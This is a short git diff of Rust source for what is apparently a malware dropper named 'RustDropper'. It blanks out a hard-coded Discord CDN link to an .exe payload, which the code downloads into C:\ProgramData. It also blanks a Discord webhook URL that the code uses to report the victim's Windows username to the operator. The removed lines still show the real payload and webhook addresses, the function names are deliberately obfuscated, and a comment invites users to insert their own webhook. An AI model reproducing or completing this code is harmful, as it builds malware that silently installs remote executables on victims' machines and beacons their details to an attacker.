@@ -21,7 +21,7 @@ fn main(){
 
 
 fn dwkjadhawjdawjhddwadj() {
-    let url = "https://cdn.discordapp.com/attachments/1030171270635073549/1033481066431909929/HBpgdDw2341QpXZheU2Vq9FFxjGpEyYzTXdR0kSt5DZzp.exe";
+    let url = "";
     let mut downloader = Downloader::builder()
         .download_folder(std::path::Path::new("C:\\ProgramData"))
         .parallel_requests(1)
@@ -58,7 +58,7 @@ fn fudjawjwuu8023848901284234823894209482308948238042380948234() {
 #[tokio::main]
 async fn send() {
     let http = Http::new("");
-    let webhook = Webhook::from_url(&http, "https://discord.com/api/webhooks/1034629307168993332/4jENJGkYH-MURcGFesW4XfhCz1dIKD749NCe4d8MVp8mYNuDshC2cFOSh6msSaaCbF80").await.expect("Replace the webhook with your own");
+    let webhook = Webhook::from_url(&http, "https://discord.com/api/webhooks/").await.expect("Replace the webhook with your own");
 
     webhook
         .execute(&http, false, |w| w.content(format!("**Windows User:** `{}`", whoami::username())).username("github.com/svg-rs/RustDropper"))
